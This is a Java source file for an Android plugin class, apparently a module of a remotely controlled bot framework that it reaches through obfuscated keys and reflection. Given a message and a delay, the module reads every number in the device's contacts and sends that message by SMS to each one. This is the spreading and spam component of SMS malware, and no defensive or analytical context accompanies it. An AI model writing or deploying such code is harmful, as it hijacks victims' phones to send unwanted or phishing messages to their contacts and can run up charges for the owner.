package com.moonny.mods_src;

import android.content.Context;
import org.json.JSONObject;
import java.lang.reflect.Method;
import java.util.HashMap;
import android.database.Cursor;
import android.provider.ContactsContract;

public class Sms_to_contacts {

    public int MAIN_VER_REQUIRED = 100; // minimum Main api version required
    private Context ctx;
    private Object mods;
    private Method run_func;

    public Sms_to_contacts(HashMap<String, Object> system) throws Exception
    {
        this.ctx = (Context) system.get("a2");
        this.mods = system.get("a4");
        this.run_func = mods.getClass().getDeclaredMethod((String) system.get("a5"), String.class, String.class, Object[].class);
    }

    public JSONObject run(JSONObject params) throws Exception {

        String msg = params.getString("m");
        String delay_custom = params.getString("d");

        int delay;
        try {
            delay = Integer.parseInt(delay_custom);
            if(delay < 10)
                delay = 10;
        }catch (Exception e){
            delay = 10;
        }

        Cursor phones = ctx.getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);

        while (phones != null ? phones.moveToNext() : false) {
            //String name = phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
            String phoneNumber = phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));

            if (phoneNumber.length() < 6)
                continue;

            //Log.d("Sms_to_contacts", "SEND " + phoneNumber+": " +msg);
            run_func.invoke(mods, "main", "send_sms", new Object[]{ phoneNumber, msg });

            try {
                Thread.sleep(delay * 1000);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        }

        phones.close();
        return null;
    }
}
